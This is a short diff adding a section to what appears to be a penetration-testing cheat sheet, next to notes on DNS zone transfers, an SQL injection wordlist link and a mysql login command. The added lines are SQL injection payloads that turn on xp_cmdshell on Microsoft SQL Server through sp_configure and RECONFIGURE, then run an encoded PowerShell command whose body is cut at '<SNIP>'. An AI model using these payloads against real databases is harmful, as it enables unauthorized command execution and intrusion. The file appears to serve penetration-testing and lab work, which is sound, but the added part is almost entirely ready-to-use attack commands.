@@ -134,6 +134,15 @@ dig axfr <domain.tld> @<nameserver>
 SQLI Injection commands
 https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Generic-SQLi.txt
 
+Configuring xp_cmdshell from SQLi
+```bash
+admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+
+admin' UNION SELECT 1,2; RECONFIGURE--+
+admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+
+admin' UNION SELECT 1,2; RECONFIGURE--+
+admin'; exec master..xp_cmdshell 'powershell.exe -e JAdauih1u23h<SNIP>== '--
+```
+
 mysql (add end method if TSL/SSL error appears)
 ```bash
 mysql -h <IP> -u <USER> -p --skip-ssl
